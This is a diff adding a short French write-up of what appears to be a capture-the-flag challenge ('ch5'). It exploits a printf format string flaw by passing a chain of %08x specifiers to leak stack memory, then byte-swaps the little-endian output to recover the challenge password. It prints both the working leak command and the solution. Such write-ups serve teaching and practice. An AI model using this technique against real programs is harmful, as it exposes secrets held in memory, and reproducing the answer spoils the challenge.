@@ -1,0 +1,13 @@
+Le programme affiche argv[1] via printf mais sans utiliser de typage.
+On peut donc passer des %08x pour printer la memoire en hexa.
+
+./ch5 "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x"
+
+On voit une potentielle string a partir du 11e bloc, on prends donc les 32bytes suivants:
+39617044 28293664 6d617045 b7000a64
+
+Little Endian donc inversion des bytes dans les blocs:
+44706139 64362928 4570616d 640a00b7
+
+Conversion, resultat = Dpa9d6)(Epamd
+
